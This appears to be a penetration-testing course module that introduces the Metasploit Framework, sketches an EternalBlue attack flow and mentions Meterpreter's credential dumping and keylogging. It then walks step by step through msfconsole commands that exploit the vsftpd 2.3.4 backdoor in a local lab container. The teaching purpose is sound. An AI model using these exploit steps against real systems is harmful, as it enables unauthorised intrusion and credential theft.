Module: Metasploit Framework Deep Dive

1. Core Architectural Concept 🧠

Metasploit Framework (MSF) is a ruby-based penetration testing platform that enables you to find, exploit, and validate vulnerabilities. Before Metasploit, hackers had to write custom scripts for every single buffer overflow they found.

Metasploit revolutionized hacking by standardizing it into three modular components:

  • Exploit: The delivery vehicle (the lockpick). e.g., Sending a malformed packet to a vulnerable SMB server.
  • Payload: The cargo (what happens when the door opens). e.g., Opening a reverse shell back to the attacker.
  • Auxiliary: Scanners and fuzzers that don't result in a shell (e.g., port scanners, vulnerability checks).

2. The Attack Flow (Meterpreter) 🎯

👨💻 Attacker msfconsole
↓
⚙️ use exploit/windows/smb/ms17_010_eternalblue
↓
📡 set RHOSTS 10.0.0.5 (Target IP)
↓
🏁 exploit -> Meterpreter Session
💡
Meterpreter vs Standard Shell: A standard reverse shell is basic. Meterpreter is Metasploit's custom, advanced payload that lives entirely in memory (harder for AV to detect) and provides built-in commands like hashdump, keyscan_start (keylogger), and screenshot.

3. Hands-on Lab: VSFTPD 2.3.4 Backdoor 🧪

🧪 Lab: Exploiting the Smiley Face Backdoor

Context & Architecture

In 2011, the master repository for the popular FTP server `vsftpd` was compromised. The attacker added a malicious backdoor to version 2.3.4. If a user tried to login with a username containing a smiley face :), the server would instantly open a secret root shell on port 6200.

Attack Steps (Run in your local Kali/Parrot Terminal)

Assuming the vulnerable lab container started successfully, its FTP port `21` is mapped to your localhost `2121`. Follow these steps in `msfconsole` to gain a root shell.

$ msfconsole -q

# 1. Search for the specific FTP exploit module
msf6 > search vsftpd

# 2. Select the module (usually index 0)
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 3. View the options required by the exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

# 4. Set the Target IP (localhost since Docker maps it locally)
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 127.0.0.1

# 5. Set the Target Port (Because Docker is mapping it to 2121)
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 2121

# 6. Fire the Exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
